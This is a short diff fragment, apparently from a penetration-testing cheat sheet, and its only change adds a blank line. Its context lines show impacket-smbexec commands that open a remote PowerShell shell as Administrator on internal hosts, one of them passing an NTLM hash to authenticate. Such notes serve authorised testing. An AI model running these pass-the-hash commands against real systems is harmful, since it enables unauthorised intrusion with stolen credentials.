@@ -92,3 +92,4 @@ impacket-smbexec Administrator@192.168.1.63 -shell-type powershell -service-name
 impacket-smbexec -no-pass -dc-ip 192.168.1.2 -shell-type powershell acme.corp/Administrator@hr-01.acme.corp -hashes :8118cb8789b3a147c790db402b016a08
 
 ```
+
